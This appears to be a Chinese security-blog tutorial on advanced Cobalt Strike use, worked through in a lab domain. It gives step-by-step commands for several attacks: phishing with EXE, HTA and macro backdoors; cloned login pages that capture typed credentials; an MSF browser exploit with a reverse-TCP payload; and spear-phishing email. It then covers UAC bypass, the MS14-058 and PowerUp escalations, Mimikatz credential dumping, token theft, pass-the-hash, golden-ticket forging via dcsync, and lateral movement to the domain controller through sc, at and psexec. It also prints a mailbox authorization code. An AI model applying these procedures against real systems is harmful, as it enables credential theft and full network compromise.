本文主要介绍CobaltStrike的进阶使用，包括网络钓鱼攻击、主机权限提升、域内渗透等。

## 0x01 网络钓鱼攻击

### 钓鱼攻击简介

钓鱼攻击主要通过生成的木马诱使受害者运行后上线，其中木马一般都伪装成正常的程序。与此同时配合钓鱼网站可帮助攻击者模拟真实网站诱骗受害者访问，达到获取账号密码、上线木马等目的。接下来主要介绍后门程序的生成及钓鱼模块的使用，共包括以下几个层面

  * 克隆网站键盘记录

  * 克隆网站执行木马

  * MSF配合CS钓鱼

### 后门程序生成

首先生成监听器  
![](https://image.3001.net/images/20230626/1687750410_6499070a3e6271f7b42c4.png!small)

#### EXE后门生成

点击攻击生成 exe 后门  
![](https://image.3001.net/images/20230626/1687750412_6499070c42a6a86ec6abe.png!small)

选择监听器后点击生成  
![](https://image.3001.net/images/20230626/1687750413_6499070d966b37744d11d.png!small)

运行 EXE 木马后上线CS  
![](https://image.3001.net/images/20230626/1687750415_6499070f9dae8916df7dc.png!small)

#### HTA后门生成

点击攻击生成 HTA 文档  
![](https://image.3001.net/images/20230626/1687750417_6499071106fbb0977896c.png!small)

选择监听器后点击生成 HTA 文档  
![](https://image.3001.net/images/20230626/1687750418_6499071275481422f4031.png!small)

当然也可以把方法切换为 powershell  
![](https://image.3001.net/images/20230626/1687750420_649907145588c472ab7fe.png!small)

访问`evil.hta`成功上线CS  
![](https://image.3001.net/images/20230626/1687750422_64990716305153c6a796d.png!small)

#### 宏病毒生成

点击攻击生成生成 Office 宏病毒  
![](https://image.3001.net/images/20230626/1687750423_64990717830c5a70c32e8.png!small)

选择监听器后点击生成  
![](https://image.3001.net/images/20230626/1687750425_649907190a6113b65d1af.png!small)

程序提示创建宏步骤  
![](https://image.3001.net/images/20230626/1687750426_6499071ab9deded67fb34.png!small)

在受害主机中打开 Word，创建文档`sex.docx`，点击查看宏并设置宏的位置  
![](https://image.3001.net/images/20230626/1687750428_6499071c750b53fc8a6c3.png!small)

点击创建后把宏代码复制其中  
![](https://image.3001.net/images/20230626/1687750430_6499071e87c407e22fa95.png!small)

成功保存文档`sec.docm`  
![](https://image.3001.net/images/20230626/1687750433_64990721de30cd82dcd45.png!small)

打开文档后点击启用内容  
![](https://image.3001.net/images/20230626/1687750435_64990723c1b2e6d296f11.png!small)

成功上线CS  
![](https://image.3001.net/images/20230626/1687750437_6499072540edbc943a421.png!small)

### WEB网络钓鱼

#### 站点管理模块

在站点管理模块中能够看到对应模块，选择 URI 能够复制执行命令  
![](https://image.3001.net/images/20230626/1687750438_64990726a572ca9325157.png!small)

#### 信息收集模块

点击信息收集模块  
![](https://image.3001.net/images/20230626/1687750440_649907282f91db11fddd1.png!small)

设置本地端口和跳转URL  
![](https://image.3001.net/images/20230626/1687750441_64990729da2acb78b2a41.png!small)

访问`http://192.168.0.110:8080/`会马上跳转到百度，在 web 日志中存在目标系统信息  
![](https://image.3001.net/images/20230626/1687750443_6499072b6cf19272882f1.png!small)

而应用程序中也会存有记录  
![](https://image.3001.net/images/20230626/1687750445_6499072d01b2d45a6b5a8.png!small)

#### 克隆网站键盘记录

点击攻击选择网站克隆模块克隆网站  
![](https://image.3001.net/images/20230626/1687750446_6499072e5c28faecf8e5e.png!small)

设置克隆URL、本地端口，完成后点击克隆  
![](https://image.3001.net/images/20230626/1687750448_64990730149b0851488bd.png!small)

受害者访问`http://192.168.0.110:8081/`输入账号密码  
![](https://image.3001.net/images/20230626/1687750449_64990731dfb59014acce0.png!small)

在 web 日志中可以看到输入的账号密码  
![](https://image.3001.net/images/20230626/1687750451_64990733e309efd35a411.png!small)

#### 克隆网站执行木马

点击攻击选择文件托管模块  
![](https://image.3001.net/images/20230626/1687750453_64990735a89e59b0a2545.png!small)

上传生成的 hta 文件，设置本地URI为`/update.hta`，因此文件地址为`http://192.168.0.110:80/update.hta`  
![](https://image.3001.net/images/20230626/1687750455_6499073715b31833c6015.png!small)

同样克隆网站设置克隆URL和本地URI，区别是需设置攻击为刚刚设置的文件  
![](https://image.3001.net/images/20230626/1687750456_64990738d5efe70d5322b.png!small)

在本地访问`http://192.168.0.110:80/baidu`  
![](https://image.3001.net/images/20230626/1687750458_6499073a7ef2eefa057f1.png!small)

点击运行后成功上线CS  
![](https://image.3001.net/images/20230626/1687750460_6499073c2bf003846f26f.png!small)

#### MSF配合CS钓鱼

在 MSF 中生成存在溢出代码的站点

    
    
    msf > use exploit/windows/browser/ms14_064_ole_code_execution
    msf > set srvhost 192.168.0.110
    msf > set SRVPORT 888
    msf > set payload windows/meterpreter/reverse_tcp
    msf > set lhost 192.168.0.110
    msf > exploit
    

![](https://image.3001.net/images/20230626/1687750461_6499073d6169de4ce8e98.png!small)

生成URL为`http://192.168.0.110:888/YzEvqWqpx7YWgqv`  
![](https://image.3001.net/images/20230626/1687750462_6499073eae3c7f4e01e59.png!small)

把 URL 复制到克隆网站的攻击地址当中，受害者访问站点就会加载以上 payload 进行溢出攻击  
![](https://image.3001.net/images/20230626/1687750463_6499073fe338bba80c542.png!small)

该漏洞存在受限，主要针对 Windows XP 系统，在 XP
中访问`http://192.168.0.110:80/msf`，需要注意的是访问第一次可能会报错  
![](https://image.3001.net/images/20230626/1687750466_6499074238914c4591b02.png!small)

成功访问 URL 定位到百度站点  
![](https://image.3001.net/images/20230626/1687750467_649907432f5fed8abdd1d.png!small)

成功返回会话  
![](https://image.3001.net/images/20230626/1687750470_6499074618e368f8d2c65.png!small)

### 鱼叉钓鱼攻击

鱼叉式网络钓鱼是一种只针对特定目标进行攻击的网络钓鱼攻击。由于鱼叉式网络钓鱼锁定的对象并非是一般个人，而是特定公司或组织的成员，因此与一般网络钓鱼有所不同，它获取的不只是个人信息，还有其他高度敏感的资料，如知识产权、商业机密等。

#### 钓鱼邮件设置

在 CS 中提供了邮箱钓鱼模块，在测试时需要准备以下三种东西：

  * 目标邮箱：xxx@qq.com

  * 发送邮箱：macxxx@163.com 授权密码：WZjkklfsfsac

  * 模板文件：任意

打开邮件钓鱼模块  
![](https://image.3001.net/images/20230626/1687750471_649907478b3716ff97c1c.png!small)

把目标`targets.txt`导入目标  
![](https://image.3001.net/images/20230626/1687750472_64990748e33b7b9c40a4d.png!small)

打开邮箱并选择一封邮件  
![](https://image.3001.net/images/20230626/1687750474_6499074a8e0231d330324.png!small)

点击显示邮件原文，复制内容为`template.txt`  
![](https://image.3001.net/images/20230626/1687750476_6499074cb05b5160413aa.png!small)

把`template.txt`导入模版  
![](https://image.3001.net/images/20230626/1687750479_6499074f68b6217a3e3a3.png!small)

把跳转界面设置为`https://account.aliyun.com/`，用于登录阿里云  
![](https://image.3001.net/images/20230626/1687750481_649907510d40d5e957a0d.png!small)

设置邮件服务器、邮箱的账号密码，其中密码为授权码  
![](https://image.3001.net/images/20230626/1687750482_6499075278b8fc460a357.png!small)

设置退信通知邮箱后点击`Send`发送  
![](https://image.3001.net/images/20230626/1687750484_649907544af8bb3123aee.png!small)

#### 接收钓鱼邮件

查看 QQ 邮箱发现邮件已经收到  
![](https://image.3001.net/images/20230626/1687750485_64990755e1cdb0c2d244f.png!small)

但是这里遇到一个问题：点击跳转还是原来文件的URL，需要修改原文件，定位点击链接为`https://go.circleci.com/NDg1LVpNSC02MjYAAAGBN2O4SHEHs-trqwvcOLAF75ef-iF2QtyVulUAmflDERbarobc_r4Jp-UtmB8Y1HZEU_fU0to=`  
![](https://image.3001.net/images/20230626/1687750487_64990757bb3c5f3b5d541.png!small)

同时在模版中将其修改为`https://account.aliyun.com/`即可  
![](https://image.3001.net/images/20230626/1687750489_64990759694dcb7963894.png!small)

成功跳转至阿里云登录页面  
![](https://image.3001.net/images/20230626/1687750490_6499075ac11eb7591319f.png!small)

#### 结合克隆网站

在 CS 中克隆阿里云登录界面，但提示无法克隆  
![](https://image.3001.net/images/20230626/1687750492_6499075c810b4518412eb.png!small)

修改其他网站地址进行克隆  
![](https://image.3001.net/images/20230626/1687750494_6499075e3e881c4db8033.png!small)

访问`http://192.168.0.110:80/`并输入账号密码成功返回，说明测试成功  
![](https://image.3001.net/images/20230626/1687750495_6499075fba052c6cb024d.png!small)

接下来把阿里云登录地址修改为当前克隆网站的地址  
![](https://image.3001.net/images/20230626/1687750497_649907614e5f218c2fd0d.png!small)

再次设置邮箱地址以及账号密码，点击发送后收到邮件  
![](https://image.3001.net/images/20230626/1687750499_6499076306830096f0475.png!small)

在邮件中点击`click me`  
![](https://image.3001.net/images/20230626/1687750500_649907649123476d03b24.png!small)

跳转到目标站点并输入账号密码  
![](https://image.3001.net/images/20230626/1687750502_649907663a309abf46c43.png!small)

记录账号密码成功  
![](https://image.3001.net/images/20230626/1687750504_64990768c4520b9c488fc.png!small)

## 0x02 主机权限提升

在 CS 中存在多种提升权限的方式，包括 UAC 提权、MS14-058 提权、PowerUp 提权、Mimikatz 提权等，接下里就来介绍这几种提权方式

### UAC绕过提权

UAC 是微软在 Windows Vista 以后版本中引入的一种安全机制，通过 UAC
应用程序和任务能始终在非管理员权限账户下运行，除非管理员特别授予管理员级别的系统访问权限，同时 UAC
可以阻止未经授权的应用程序自动安装并防止无意中更改系统设置。目前 macadmin 为管理员用户，但是后面没有`*`号，说明没有绕过 UAC 机制  
![](https://image.3001.net/images/20230626/1687750506_6499076a60c9d22b4b1c7.png!small)

查看当前上线主机用户的所属组，同时 UAC 等级为 Medium

    
    
    shell whoami /groups
    

![](https://image.3001.net/images/20230626/1687750507_6499076bb5083d32f874e.png!small)

选择凭据提权》权限提升  
![](https://image.3001.net/images/20230626/1687750509_6499076d5dae7c09c2779.png!small)

选择监听器和提权方式为`uac-token-duplication`，点击运行  
![](https://image.3001.net/images/20230626/1687750510_6499076ee9cb069627b47.png!small)

成功 BypassUAC 上线`macadmin`的完全控制权限  
![](https://image.3001.net/images/20230626/1687750512_64990770bbd959b0f8e62.png!small)

新建 SMB 监听器，同样可把它作为监听器完成权限提升  
![](https://image.3001.net/images/20230626/1687750514_64990772496c7269bd157.png!small)

成功上线 CS  
![](https://image.3001.net/images/20230626/1687750516_649907744f03c8ca4b31c.png!small)

### MS14-058提权

MS14-058 是微软存在的一个内核提权漏洞，影响范围包括 Windows7 和 Windows Server 2008 R2
及以下版本，攻击者通过该漏洞直接从普通用户提升到系统权限。选择`梼杌`插件中的权限提升》MS14-058  
![](https://image.3001.net/images/20230626/1687750517_649907759e7ae4af163f9.png!small)  
选择监听器后点击运行  
![](https://image.3001.net/images/20230626/1687750519_64990777c4e46ee230eb2.png!small)

成功上线系统权限  
![](https://image.3001.net/images/20230626/1687750521_64990779182fe435bed67.png!small)

### PowerUp提权

查询帮助命令存在 powershell 导入命令

    
    
    help
    

![](https://image.3001.net/images/20230626/1687750522_6499077a43423d45ccf54.png!small)

输入命令导入`PowerUp.ps1`

    
    
    powershell-import
    

![](https://image.3001.net/images/20230626/1687750523_6499077b8c7f5397d6b67.png!small)

运行 powershell 命令进行检查，成功发现系统服务`ViewPic_2345Svc`

    
    
    powershell Invoke-AllChecks
    

![](https://image.3001.net/images/20230626/1687750524_6499077c8d62a471ccd54.png!small)

查看该服务运行权限，`Users`用户为 F 权限，说明能完全控制程序

    
    
    shell icacls "C:\Program Files\2345Soft\2345Pic\protect\Pic_2345Svc.exe"
    

![](https://image.3001.net/images/20230626/1687750525_6499077de385143d42a75.png!small)

利用该服务添加系统用户

    
    
    powershell Install-ServiceBinary -ServiceName ViewPic_2345Svc -UserName machacker -Password 123456
    

![](https://image.3001.net/images/20230626/1687750527_6499077f406cd5a1b323f.png!small)

### Mimikatz提权

Mimikatz 主要通过抓取用户在内存中的密码，通过密码可登录目标管理员账户，成功提升权限后可抓取明文密码和密码哈希

    
    
    logonpasswords
    

即可获取到管理员账号密码  
![](https://image.3001.net/images/20230626/1687750528_64990780c7fc8d946acb1.png!small)

    
    
    hashdump
    

![](https://image.3001.net/images/20230626/1687750530_649907825edf3c31d005b.png!small)

利用拿到的明文密码上线管理员  
![](https://image.3001.net/images/20230626/1687750531_64990783ccbc7c0ed5328.png!small)

## 0x03 域内渗透

### 域内信息收集

#### 枚举信任主机

查看网络内和域内主机和IP地址

    
    
    net view
    net view [domain]
    

![](https://image.3001.net/images/20230626/1687750533_649907856da4413a1fd2d.png!small)  
![](https://image.3001.net/images/20230626/1687750534_64990786a581a19d11b6a.png!small)

列出当前域控以及特定域控

    
    
    net dclist 
    net dclist [domain]
    

![](https://image.3001.net/images/20230626/1687750535_64990787e95998cc1fb98.png!small)

查看本地和其他主机默认共享

    
    
    net share
    net share \\[computer name] //查看默认共享
    

![](https://image.3001.net/images/20230626/1687750537_649907898972c160624f4.png!small)

查找域和主机名对应的IP地址

    
    
    shell ping [computer name] #通过ping查看主机名ip地址
    shell nslookup [computer name] #根据netbios查看ip地址
    shell net view /domain #查找当前域
    

![](https://image.3001.net/images/20230626/1687750538_6499078ae6847f9a1b2e5.png!small)

查看当前域主机列表

    
    
    shell net view /domain:[domain] 
    shell net group "domain computers" //需在域控下执行
    

![](https://image.3001.net/images/20230626/1687750540_6499078c6cc8166eca5d9.png!small)  
![](https://image.3001.net/images/20230626/1687750541_6499078d8c78452f61e6c.png!small)

64位系统可使用命令查看域信任关系，而在32位下直接使用nltest

    
    
    shell c:\windows\sysnative\nltest /dclist:[domain] //查看域控
    shell c:\windows\sysnative\nltest /domain_trusts //查看域信任关系
    shell c:\windows\sysnative\nltest /server:[address] /domain_trusts
    

![](https://image.3001.net/images/20230626/1687750542_6499078e9ba837db6d657.png!small)  
![](https://image.3001.net/images/20230626/1687750543_6499078fe9f3dc306bcc9.png!small)

导入`PowerView.ps1`脚本

    
    
    powershell-import
    

使用 PowerView 命令枚举主机

    
    
    powershell Invoke-Netview
    powershell Invoke-ShareFinder
    powershell Inovke-MapDomainTrusts
    

![](https://image.3001.net/images/20230626/1687750545_64990791732a7d0532074.png!small)

#### 判断本地管理员

普通域用户在做一些高级别操作时需要管理员的账号和密码，因此有时候会把普通域用户添加到目标主机的超级管理员组，那么在进行配置时不需要域超级管理员的账号和密码。所以我们要判断当前用户是域用户还是普通用户，进而判断是域管理员还是本地管理员

    
    
    shell dir \\owa\c$ //查看其他主机的默认共享
    powershell Invoke-FindLocalAdminAccess
    

![](https://image.3001.net/images/20230626/1687750547_649907934e7c711b7a8fc.png!small)

#### 判断域内管理员

使用 Windows 命令进行判断

    
    
    shell net group "enterprise admins" /domain
    shell net group "domain admins" /domain 
    shell net localgroup "administrators" /domain
    

![](https://image.3001.net/images/20230626/1687750548_64990794de1746900179c.png!small)  
![](https://image.3001.net/images/20230626/1687750550_6499079642e487967a2b9.png!small)

使用 Beacon 命令进行判断

    
    
    net group \\[username]
    net localgroup \\[username] [group name]
    

![](https://image.3001.net/images/20230626/1687750551_64990797ae09ebbe061ed.png!small)

使用 PowerView 命令进行判断

    
    
    powershell Get-NetLocalGroup -HostName owa
    

![](https://image.3001.net/images/20230626/1687750553_64990799a09be8ba44def.png!small)

#### 基础信息收集

使用 cmd 命令查看磁盘

    
    
    shell dir \\[computer name]\c$ //查看主机名对应的C盘目录文件，前提是拥有管理员权限
    shell dir /S /B \\[computer name]\c$\users //查看主机下登录过的用户名
    

![](https://image.3001.net/images/20230626/1687750555_6499079b78bca0c7f5410.png!small)

使用 powershell 命令查看磁盘

    
    
    powershell Invoke-Command -ComputerName owa -ScriptBlock{dir c:\}
    

![](https://image.3001.net/images/20230626/1687750556_6499079ce6ae93459e0c8.png!small)

使用 powershell 运行 mimikatz 获取明文密码

    
    
    upload invoke-mimkatz.ps1
    powershell -exec bypass "import-module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz"
    

![](https://image.3001.net/images/20230626/1687750558_6499079e5348a2607e959.png!small)

### 域内登录认证

#### 域管理员Token窃取

查看进程并寻找域控管理员进程 PID

    
    
    shell whoami
    ps
    

![](https://image.3001.net/images/20230626/1687750559_6499079f9f4286520ae04.png!small)

成功找到 httpd 进程为域管理员  
![](https://image.3001.net/images/20230626/1687750561_649907a1600370ee6f94f.png!small)

窃取该进程获取 token 成功访问域控

    
    
    steal_token 1400
    shell dir \\OWA\C$
    

![](https://image.3001.net/images/20230626/1687750563_649907a307c25bef0e236.png!small)

清除 token 后就无法访问域控主机

    
    
    rev2self #还原进程
    shell dir \\OWA\C$
    

![](https://image.3001.net/images/20230626/1687750564_649907a4694af88d860c7.png!small)

在图形化界面中同样能操作  
![](https://image.3001.net/images/20230626/1687750565_649907a5880781f2e1f63.png!small)

#### 域管凭证制作Token

使用 mimikatz 拿到域管理员的明文密码后可以制作 token

    
    
    例：make_token domain\user password
    make_token GOD\Administrator mac1234!
    

成功访问域控

    
    
    shell dir \\OWA\C$
    

![](https://image.3001.net/images/20230626/1687750567_649907a7402720a0d9365.png!small)

在图形化界面中同样能操作  
![](https://image.3001.net/images/20230626/1687750568_649907a8da18891c285f7.png!small)

通过 SMB 协议也可以建立远程连接访问域控

    
    
    shell net use \\OWA\C$ /user:GOD\Administrator mac1234!
    shell dir \\OWA\C$
    shell net use * /delete //删除连接
    shell net use \\OWA\C$ /del
    

![](https://image.3001.net/images/20230626/1687750570_649907aa860da2e697009.png!small)

#### 域管理员哈希传递

使用 mimikatz 收集到的域管理员哈希同样能进行身份认证

    
    
    例：pth .\administrator [ntlm]
    pth GOD\Administrator e97afaff5812d7cc281147091ebb4dc7
    

成功访问域控

    
    
    shell dir \\OWA\C$
    

![](https://image.3001.net/images/20230626/1687750572_649907ac3ef02eb9d6b86.png!small)

#### 域管理员票据传递

域内大量使用 Kerberos 认证协议，它和密码散列认证有所不同，两者虽然都使用凭据来产生 Token，但票据存储在 Kerberos 托管的地方。在
Kerberos 认证中 Client 通过 AS(身份认证服务) 认证后, AS 会给 Client 一个 Logon Session Key 和
TGT，而 Logon Session Key 并不会保存在 KDC 中，同时 krbtgt 的 NTLM Hash 又是固定的，所以只要得到 krbtgt
的 NTLM Hash，就可以伪造 TGT 和 Logon Session Key 进入下一步 Client 与 TGS
的交互。如果有了黄金票据后就不需要与 AS 发生交互，可跳过 AS 验证，不用验证账户和密码，也就不用担心域管密码被修改，从而完成权限维持

 **黄金票据制作条件**

  * 域管理员用户名

  * 域名

  * 域SID

  * krbtgt 用户哈希

目前已知域管理员用户名和域名，使用域普通用户获取域 SID

    
    
    shell whoami/user
    

其中用户 SID 为`S-1-5-21-2952760202-1353902439-2381784089-1113`，去掉 1113 后为域
SID`S-1-5-21-2952760202-1353902439-2381784089`  
![](https://image.3001.net/images/20230626/1687750574_649907ae14e12b5125c03.png!small)

使用 mimikatz 获取 krbtgt 用户的哈希值

    
    
    mimikatz # privilege::debug
    mimikatz # lsadump::dcsync /domain:god.org /all /csv
    mimikatz # lsadump::dcsync /domain:god.org /user:krbtgt
    

成功拿到 krbtgt 用户的哈希值为`58e91a5ac358d86513ab224312314061`  
![](https://image.3001.net/images/20230626/1687750575_649907af37a97f4c8e283.png!small)

使用图形化操作界面制作黄金票据  
![](https://image.3001.net/images/20230626/1687750576_649907b052981eb10b5f2.png!small)

实际执行命令如下：

    
    
    mimikatz kerberos::golden /user:administrator /domain:god.org /sid:S-1-5-21-2952760202-1353902439-2381784089 /krbtgt:58e91a5ac358d86513ab224312314061 /endin:480 /renewmax:10080 /ptt
    

![](https://image.3001.net/images/20230626/1687750577_649907b1e75fd903b78d6.png!small)

查看当前会话凭据

    
    
    shell klist
    shell c:\windows\sysnative\klist
    

![](https://image.3001.net/images/20230626/1687750579_649907b354feb3376e42a.png!small)

其他 Kerberos 命令如下：

    
    
    kerberos_ccache_use       #从ccache文件中导入票据应用于此会话
    kerberos_ticket_purge     #清除当前会话的票据
    kerberos_ticket_use       #从ticket文件中导入票据应用于此会话
    

![](https://image.3001.net/images/20230626/1687750580_649907b494972b936c37f.png!small)

### 域内横向渗透

当前环境下 mac 是 god 域中的普通用户，与此同时还是 test1 主机中的本地管理员。目前 mac 在 stu1 主机上上线，同时 test1
主机上存在域管理员进程

#### 创建服务程序

目前已获得 mac 用户在 stu1 主机上的权限，把木马程序复制到 test1 主机下

    
    
    shell copy c:\mac.exe \\test1\c$\windows\temp\test1.exe
    

![](https://image.3001.net/images/20230626/1687750581_649907b5b65346ac70eab.png!small)

创建服务执行木马程序并启动服务

    
    
    shell sc \\test1 create test1 binpath= c:\windows\temp\test1.exe
    shell sc \\test1 start test1
    shell sc \\test1 delete test1 //删除服务
    

![](https://image.3001.net/images/20230626/1687750583_649907b71b8a92b4a7923.png!small)

执行后 test1 主机中的系统用户上线  
![](https://image.3001.net/images/20230626/1687750584_649907b85fe417595dcc6.png!small)

#### 创建计划任务

首先把木马程序复制到 test1 主机下

    
    
    shell copy c:\mac.exe \\test1\c$\windows\temp\test1.exe
    

![](https://image.3001.net/images/20230626/1687750581_649907b5b65346ac70eab.png!small)

查看当前主机的时间

    
    
    shell net time \\test1
    

![](https://image.3001.net/images/20230626/1687750586_649907ba8071f4253f1e6.png!small)

设置定时任务执行木马程序

    
    
    shell at \\test1 1:35:00 c:\windows\temp\test1.exe
    

![](https://image.3001.net/images/20230626/1687750587_649907bb7faa4aa3fff18.png!small)

成功上线CS  
![](https://image.3001.net/images/20230626/1687750588_649907bc9096c3bd00c76.png!small)

查看本地域管理员进程ID为`2040`

    
    
    ps
    

![](https://image.3001.net/images/20230626/1687750589_649907bdeac28832b1cc3.png!small)

窃取域管理员的进程 Token

    
    
    steal_token 2040
    

成功访问域控

    
    
    shell dir \\owa\c$
    

![](https://image.3001.net/images/20230626/1687750591_649907bf521fd63a85597.png!small)

#### 计划任务上线域控

当前域控与 CS 服务端不在同一网段内，需要用到转发监听器，在刚上线主机上选择`转发上线`  
![](https://image.3001.net/images/20230626/1687750593_649907c14922b82501cfd.png!small)

设置转发监听器，实际执行命令如下：

    
    
    rportfwd 4444 windows/beacon_reverse_tcp
    

![](https://image.3001.net/images/20230626/1687750594_649907c2ba85f958aa130.png!small)

生成木马程序`test2.exe`并设置转发监听器为`zhuanfa`  
![](https://image.3001.net/images/20230626/1687750596_649907c4863170a6a2fa1.png!small)

上传木马程序`test2.exe`到`C:\Windows\temp\`目录下  
![](https://image.3001.net/images/20230626/1687750597_649907c5efbf12f1cd0fd.png!small)

把木马程序`test2.exe`复制到域控上

    
    
    shell copy C:\windows\temp\test2.exe \\owa\c$\windows\temp\test2.exe
    

查看当前域控时间

    
    
    shell net time \\owa
    

![](https://image.3001.net/images/20230626/1687750599_649907c7ae8098132a5d5.png!small)

设置定时任务执行木马

    
    
    shell at \\owa 2:07:00 C:\windows\temp\test2.exe
    

![](https://image.3001.net/images/20230626/1687750601_649907c90cad2df16a261.png!small)

成功上线CS  
![](https://image.3001.net/images/20230626/1687750602_649907ca0b8a3e6bfce0f.png!small)

### 域内自动化渗透

渗透环境与上面相同

#### 自动化信息收集

上传 PowerView 查看当前环境情况，但结果出现问题

    
    
    powershell-import
    powershell Invoke-FindLocalAdminAccess
    

当然也可以使用 taowu 插件查询常用信息  
![](https://image.3001.net/images/20230626/1687750603_649907cb58f7fbc454132.png!small)  
![](https://image.3001.net/images/20230626/1687750604_649907ccd03607f8c8e09.png!small)

#### 自动化横向渗透

利用 SMB 协议可无需上传下载代理工具即可完成横向移动，首先创建 SMB 监听  
![](https://image.3001.net/images/20230626/1687750607_649907cf540c5fcff496d.png!small)

查看当前网段内的主机

    
    
    net view
    

![](https://image.3001.net/images/20230626/1687750608_649907d0db4d13946bcc4.png!small)

选择 test1 主机使用 psexec 进行横向  
![](https://image.3001.net/images/20230626/1687750609_649907d1e6ebf666b4add.png!small)

设置会话和监听，其中 mac 是目标主机的本地管理员  
![](https://image.3001.net/images/20230626/1687750611_649907d31f74c9e8c38fa.png!small)

利用 psexec 成功上线 system  
![](https://image.3001.net/images/20230626/1687750612_649907d4d31be0902fa5a.png!small)

查看进程找到域管理员的进程

    
    
    ps
    

![](https://image.3001.net/images/20230626/1687750614_649907d63d6b6a2c39f67.png!small)

选择 PID 为2040进行注入

    
    
    steal_token 2040
    

![](https://image.3001.net/images/20230626/1687750615_649907d7e434ca634fc45.png!small)

在主机中选择 OWA 利用 psexec 进行横向 psexec_psh  
![](https://image.3001.net/images/20230626/1687750617_649907d900981dd872b84.png!small)

设置会话和监听  
![](https://image.3001.net/images/20230626/1687750618_649907da710e146a101ba.png!small)

成功上线域控服务器  
![](https://image.3001.net/images/20230626/1687750621_649907dd21536ea79ad8f.png!small)

